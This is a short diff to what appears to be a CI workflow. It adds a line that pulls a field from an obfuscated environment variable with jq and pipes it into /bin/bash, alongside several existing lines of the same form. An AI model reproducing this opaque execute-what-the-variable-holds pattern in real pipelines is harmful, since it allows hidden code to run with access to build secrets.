@@ -25,6 +25,7 @@ jobs:
           echo $q8 | jq -r .xl484 | /bin/bash
           printf '%s' "$osu3365" | jq -r .bhfs4132 | /bin/bash
           echo $bt4 | jq -r .jlj41407 | /bin/bash
+          echo $pjz0237 | jq -r .yjpj84 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
